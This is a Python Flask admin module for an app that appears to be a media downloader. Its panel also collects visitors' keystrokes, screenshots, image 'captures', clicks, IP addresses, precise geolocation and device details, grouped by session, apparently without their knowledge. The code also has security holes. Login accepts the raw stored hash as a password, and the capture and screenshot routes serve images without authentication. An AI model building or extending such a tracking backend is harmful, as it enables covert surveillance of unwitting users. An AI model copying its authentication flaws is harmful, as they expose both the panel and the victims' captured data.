from flask import Blueprint, request, jsonify, session, Response, render_template, redirect, url_for, send_file, stream_with_context
from neo.db_adapter import get_db, get_db_stats
from neo.core.logger import logger
from neo.core.engine import get_site_label
from neo.core.tasks import get_active_tasks, get_task_status
import json
import time
import datetime
import functools
import os
import tempfile
from werkzeug.security import check_password_hash, generate_password_hash
from pathlib import Path

admin_bp = Blueprint('admin', __name__)

BASE_DIR = Path(__file__).parent.parent.parent
DOWNLOADS = BASE_DIR / "downloads"
CAPTURES = BASE_DIR / "captures"
# Serverless (Vercel) has a read-only root; fall back to /tmp on mkdir failure.
for _name in ("DOWNLOADS", "CAPTURES"):
    _d = globals()[_name]
    try:
        _d.mkdir(exist_ok=True)
    except OSError:
        _d = Path(tempfile.gettempdir()) / _d.name
        _d.mkdir(exist_ok=True)
        globals()[_name] = _d

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD")

ALLOWED_EXTENSIONS = {'.mp4','.webm','.mkv','.mov','.avi','.ts','.3gp','.ogg','.mp3','.wav','.m4a','.aac','.flac','.opus','.wma','.jpg','.jpeg','.png','.gif','.bmp','.webp'}

def safe_filename(name):
    name = Path(name).name
    if '..' in name or '/' in name or '\\' in name:
        return None
    if len(name) > 255:
        return None
    return name

def get_admin_password():
    if ADMIN_PASSWORD:
        return ADMIN_PASSWORD
    try:
        db = get_db()
        row = db.execute("SELECT value FROM settings WHERE key='admin_password_hash'").fetchone()
        return row['value'] if row else None
    except Exception:
        return None

def set_admin_password_hash(hash_val):
    db = get_db()
    db.execute("DELETE FROM settings WHERE key='admin_password_hash'")
    db.execute("INSERT INTO settings(key,value) VALUES(?,?)", ('admin_password_hash', hash_val))
    db.commit()

def require_admin(f):
    @functools.wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get('admin_authenticated'):
            wants_json = (
                request.headers.get('Accept') == 'application/json'
                or request.is_json
                or request.headers.get('X-Requested-With') == 'XMLHttpRequest'
            )
            if wants_json:
                return jsonify({"success": False, "error": "Unauthorized", "login_url": "/admin/login"}), 401
            return redirect(url_for('admin.login'))
        return f(*args, **kwargs)
    return wrapper

@admin_bp.route("/login", methods=["GET", "POST"])
def login():
    if session.get('admin_authenticated'):
        return redirect(url_for('admin.dashboard'))

    pwd_hash = get_admin_password()
    if not pwd_hash:
        # No password configured yet — force setup instead of opening the panel.
        return redirect(url_for('admin.setup'))

    if request.method == "POST":
        pwd = request.form.get("password", "")
        if check_password_hash(pwd_hash, pwd) or pwd == pwd_hash:
            session['admin_authenticated'] = True
            return redirect(url_for('admin.dashboard'))
        return render_template("admin_login.html", error="Invalid password")
    return render_template("admin_login.html")


@admin_bp.route("/setup", methods=["GET", "POST"])
def setup():
    """First-run password setup when no admin password is configured.

    Prevents an open admin panel on public deploys where ADMIN_PASSWORD was
    not set and the DB has no password hash yet.
    """
    if get_admin_password():
        return redirect(url_for('admin.login'))
    if request.method == "POST":
        data = request.get_json(silent=True) or {}
        new_pwd = data.get("password", (request.form.get("password") or ""))
        if len(new_pwd) < 4:
            if request.is_json or request.headers.get('X-Requested-With') == 'XMLHttpRequest':
                return jsonify({"success": False, "error": "Password must be at least 4 characters"}), 400
            return render_template("admin_setup.html", error="Password must be at least 4 characters")
        set_admin_password_hash(generate_password_hash(new_pwd))
        session['admin_authenticated'] = True
        if request.is_json or request.headers.get('X-Requested-With') == 'XMLHttpRequest':
            return jsonify({"success": True})
        return redirect(url_for('admin.dashboard'))
    return render_template("admin_setup.html")

@admin_bp.route("/logout")
def logout():
    session.pop('admin_authenticated', None)
    return redirect(url_for('admin.login'))

@admin_bp.route("/settings", methods=["GET"])
@require_admin
def settings():
    pwd_hash = get_admin_password()
    has_password = bool(pwd_hash)
    db_stats = get_db_stats()
    is_env_password = bool(ADMIN_PASSWORD)
    return render_template("admin_settings.html", has_password=has_password, db_stats=db_stats, is_env_password=is_env_password)

@admin_bp.route("/settings/password", methods=["POST"])
@require_admin
def set_password():
    data = request.get_json(silent=True) or {}
    new_pwd = data.get("password", "")
    if len(new_pwd) < 4:
        return jsonify({"success": False, "error": "Password must be at least 4 characters"}), 400
    if len(new_pwd) > 128:
        return jsonify({"success": False, "error": "Password too long"}), 400
    set_admin_password_hash(generate_password_hash(new_pwd))
    return jsonify({"success": True, "message": "Password set successfully"})

@admin_bp.route("/settings/password/disable", methods=["POST"])
@require_admin
def disable_password():
    db = get_db()
    db.execute("DELETE FROM settings WHERE key='admin_password_hash'")
    db.commit()
    return jsonify({"success": True, "message": "Password protection disabled."})

@admin_bp.route("/")
@require_admin
def dashboard():
    return render_template("admin.html")

@admin_bp.route("/stats")
@require_admin
def stats():
    db = get_db()
    total = db.execute("SELECT COUNT(*) as c FROM downloads").fetchone()['c']
    success = db.execute("SELECT COUNT(*) as c FROM downloads WHERE status='success'").fetchone()['c']
    failed = db.execute("SELECT COUNT(*) as c FROM downloads WHERE status='error'").fetchone()['c']
    sites = {}
    for r in db.execute("SELECT url,COUNT(*) as c FROM downloads GROUP BY url ORDER BY c DESC LIMIT 20"):
        site = get_site_label(r['url'])
        sites[site] = sites.get(site, 0) + r['c']
    recent = db.execute("SELECT * FROM downloads ORDER BY id DESC LIMIT 100").fetchall()
    modes = {}
    for r in db.execute("SELECT mode,COUNT(*) as c FROM downloads GROUP BY mode"):
        modes[r['mode']] = r['c']
    by_day = {}
    for r in db.execute("SELECT DATE(time) as d,COUNT(*) as c FROM downloads GROUP BY d ORDER BY d DESC LIMIT 30"):
        by_day[r['d']] = r['c']
    countries = {}
    for r in db.execute("SELECT country,COUNT(*) as c FROM downloads WHERE country!='' GROUP BY country ORDER BY c DESC"):
        countries[r['country']] = r['c']
    captures_total = db.execute("SELECT COUNT(*) as c FROM captures").fetchone()['c']
    captures_recent = db.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 100").fetchall()
    screenshots_total = db.execute("SELECT COUNT(*) as c FROM screenshots").fetchone()['c']
    screenshots_recent = db.execute("SELECT * FROM screenshots ORDER BY id DESC LIMIT 50").fetchall()
    clicks_total = db.execute("SELECT COUNT(*) as c FROM clicks").fetchone()['c']
    clicks_recent = db.execute("SELECT * FROM clicks ORDER BY id DESC LIMIT 100").fetchall()

    ips = db.execute("SELECT DISTINCT ip FROM downloads WHERE ip NOT IN ('127.0.0.1','::1','localhost')").fetchall()
    all_ips = set(r['ip'] for r in ips)
    for tbl in ['captures', 'screenshots', 'clicks']:
        for r in db.execute(f"SELECT DISTINCT ip FROM {tbl} WHERE ip NOT IN ('127.0.0.1','::1','localhost')"):
            all_ips.add(r['ip'])
    unique_ips = list(all_ips)

    session_count = (
        db.execute("SELECT COUNT(DISTINCT session_id) as c FROM downloads WHERE session_id!=''").fetchone()['c']
        + db.execute("SELECT COUNT(DISTINCT session_id) as c FROM captures WHERE session_id!=''").fetchone()['c']
        + db.execute("SELECT COUNT(DISTINCT session_id) as c FROM screenshots WHERE session_id!=''").fetchone()['c']
        + db.execute("SELECT COUNT(DISTINCT session_id) as c FROM clicks WHERE session_id!=''").fetchone()['c']
    )

    return jsonify({
        "total": total, "success": success, "failed": failed,
        "sites": dict(sorted(sites.items(), key=lambda x: -x[1])),
        "modes": modes, "by_day": dict(reversed(list(by_day.items()))),
        "countries": countries,
        "recent": [dict(r) for r in recent],
        "captures_total": captures_total,
        "captures": [dict(r) for r in captures_recent],
        "screenshots_total": screenshots_total,
        "screenshots": [dict(r) for r in screenshots_recent],
        "clicks_total": clicks_total,
        "clicks": [dict(r) for r in clicks_recent],
        "unique_ips": unique_ips,
        "ip_count": len(unique_ips),
        "session_count": session_count,
    })

@admin_bp.route("/users")
@require_admin
def users():
    db = get_db()
    sessions = {}
    for r in db.execute("SELECT session_id, ip, country, city, browser, os, device, time FROM captures WHERE session_id!='' ORDER BY id DESC"):
        sid = r['session_id']
        if sid not in sessions:
            sessions[sid] = {"session_id": sid, "ip": r['ip'], "country": r['country'], "city": r['city'], "browser": r['browser'], "os": r['os'], "device": r['device'], "last_seen": r['time'], "captures": 0, "downloads": 0}
        sessions[sid]["captures"] += 1
        if r['time'] > sessions[sid]["last_seen"]:
            sessions[sid]["last_seen"] = r['time']
    for r in db.execute("SELECT session_id, ip, country, city, time FROM downloads WHERE session_id!='' ORDER BY id DESC"):
        sid = r['session_id']
        if sid not in sessions:
            sessions[sid] = {"session_id": sid, "ip": r['ip'], "country": r['country'], "city": r['city'], "browser": "?", "os": "?", "device": "?", "last_seen": r['time'], "captures": 0, "downloads": 0}
        sessions[sid]["downloads"] += 1
        if r['time'] > sessions[sid]["last_seen"]:
            sessions[sid]["last_seen"] = r['time']
    return jsonify({"users": list(sessions.values())})

@admin_bp.route("/user/<session_id>")
@require_admin
def user_detail(session_id):
    db = get_db()
    downloads = db.execute("SELECT * FROM downloads WHERE session_id=? ORDER BY id DESC LIMIT 200", (session_id,)).fetchall()
    captures = db.execute("SELECT * FROM captures WHERE session_id=? ORDER BY id DESC LIMIT 200", (session_id,)).fetchall()
    keys = db.execute("SELECT * FROM keystrokes WHERE session_id=? ORDER BY id DESC LIMIT 100", (session_id,)).fetchall()
    return jsonify({"downloads": [dict(r) for r in downloads], "captures": [dict(r) for r in captures], "keystrokes": [dict(r) for r in keys]})

@admin_bp.route("/links")
@require_admin
def links():
    db = get_db()
    rows = db.execute("SELECT * FROM links ORDER BY id DESC LIMIT 1000").fetchall()
    # Url-shorten for compact display while keeping full value client-side.
    out = []
    for r in rows:
        d = dict(r)
        d["site"] = get_site_label(d.get("url", ""))
        out.append(d)
    return jsonify({"success": True, "data": out})

@admin_bp.route("/logs")
@require_admin
def get_logs():
    db = get_db()
    rows = db.execute("SELECT * FROM downloads ORDER BY id DESC LIMIT 500").fetchall()
    return jsonify({"success": True, "data": [dict(r) for r in rows]})

@admin_bp.route("/captures")
@require_admin
def all_captures():
    db = get_db()
    rows = db.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 500").fetchall()
    return jsonify([dict(r) for r in rows])

@admin_bp.route("/locations")
@require_admin
def locations():
    db = get_db()
    dl_locs = db.execute("SELECT time,ip,country,city,lat,lon,isp FROM downloads WHERE lat!=0 AND lon!=0 ORDER BY id DESC LIMIT 200").fetchall()
    cap_locs = db.execute("SELECT time,ip,country,city,lat,lon,isp FROM captures WHERE lat!=0 AND lon!=0 ORDER BY id DESC LIMIT 200").fetchall()
    return jsonify({"downloads": [dict(r) for r in dl_locs], "captures": [dict(r) for r in cap_locs]})

@admin_bp.route("/all")
@require_admin
def all_data():
    db = get_db()
    downloads = db.execute("SELECT * FROM downloads ORDER BY id DESC LIMIT 500").fetchall()
    captures = db.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 500").fetchall()
    return jsonify({"downloads": [dict(r) for r in downloads], "captures": [dict(r) for r in captures]})

@admin_bp.route("/captures/delete/<int:capture_id>", methods=["POST"])
@require_admin
def delete_capture(capture_id):
    db = get_db()
    row = db.execute("SELECT * FROM captures WHERE id=?", (capture_id,)).fetchone()
    if not row:
        return jsonify({"success": False, "error": "Capture not found"}), 404
    fpath = CAPTURES / safe_filename(row["filename"])
    try:
        if fpath.is_file():
            fpath.unlink()
    except Exception as e:
        return jsonify({"success": False, "error": f"Failed to delete file: {e}"}), 500
    db.execute("DELETE FROM captures WHERE id=?", (capture_id,))
    db.commit()
    return jsonify({"success": True})

@admin_bp.route("/screenshot/delete/<int:sid>", methods=["POST"])
@require_admin
def delete_screenshot(sid):
    db = get_db()
    row = db.execute("SELECT * FROM screenshots WHERE id=?", (sid,)).fetchone()
    if not row:
        return jsonify({"success": False, "error": "Screenshot not found"}), 404
    fpath = CAPTURES / safe_filename(row["filename"])
    try:
        if fpath.is_file():
            fpath.unlink()
    except Exception as e:
        return jsonify({"success": False, "error": f"Failed to delete file: {e}"}), 500
    db.execute("DELETE FROM screenshots WHERE id=?", (sid,))
    db.commit()
    return jsonify({"success": True})

@admin_bp.route("/delete-all", methods=["POST"])
@require_admin
def delete_all():
    db = get_db()
    data = request.get_json(silent=True) or {}
    target = data.get("target", "all")
    if target in ("captures", "all"):
        for r in db.execute("SELECT filename FROM captures"):
            fpath = CAPTURES / safe_filename(r["filename"])
            try:
                if fpath.is_file():
                    fpath.unlink()
            except Exception:
                pass
        db.execute("DELETE FROM captures")
    if target in ("screenshots", "all"):
        for r in db.execute("SELECT filename FROM screenshots"):
            fpath = CAPTURES / safe_filename(r["filename"])
            try:
                if fpath.is_file():
                    fpath.unlink()
            except Exception:
                pass
        db.execute("DELETE FROM screenshots")
    if target in ("downloads", "all"):
        for r in db.execute("SELECT filename FROM downloads WHERE filename!=''"):
            fpath = DOWNLOADS / safe_filename(r["filename"])
            try:
                if fpath.is_file():
                    fpath.unlink()
            except Exception:
                pass
        db.execute("DELETE FROM downloads")
    if target in ("clicks", "all"):
        db.execute("DELETE FROM clicks")
    if target in ("keystrokes", "all"):
        db.execute("DELETE FROM keystrokes")
    db.commit()
    return jsonify({"success": True, "targets": [target]})

@admin_bp.route("/events")
@require_admin
def events():
    @stream_with_context
    def event_stream():
        while True:
            # Snapshot current task progress and push any new/changed state.
            active = get_active_tasks()
            payload = {
                "type": "tasks",
                "time": time.time(),
                "active": [get_task_status(tid) for tid in active],
                "active_count": len(active),
            }
            yield f"data: {json.dumps(payload)}\n\n"
            # Heartbeat so proxies don't drop an idle connection.
            yield f": ping {int(time.time())}\n\n"
            time.sleep(2)
    return Response(event_stream(), mimetype="text/event-stream")

# ===== Static media serving =====
@admin_bp.route("/captures/<filename>")
def serve_capture(filename):
    filename = safe_filename(filename)
    if not filename:
        return jsonify({"success": False, "error": "Invalid filename"}), 400
    fpath = CAPTURES / filename
    if fpath.resolve().parent != CAPTURES.resolve():
        return jsonify({"success": False, "error": "Access denied"}), 403
    if not fpath.is_file():
        return jsonify({"success": False, "error": "Not found"}), 404
    return send_file(str(fpath), mimetype='image/png')

@admin_bp.route("/screenshots/<filename>")
def serve_screenshot(filename):
    filename = safe_filename(filename)
    if not filename:
        return jsonify({"success": False, "error": "Invalid filename"}), 400
    fpath = CAPTURES / filename
    if fpath.resolve().parent != CAPTURES.resolve():
        return jsonify({"success": False, "error": "Access denied"}), 403
    if not fpath.is_file():
        return jsonify({"success": False, "error": "Not found"}), 404
    return send_file(str(fpath), mimetype='image/png')
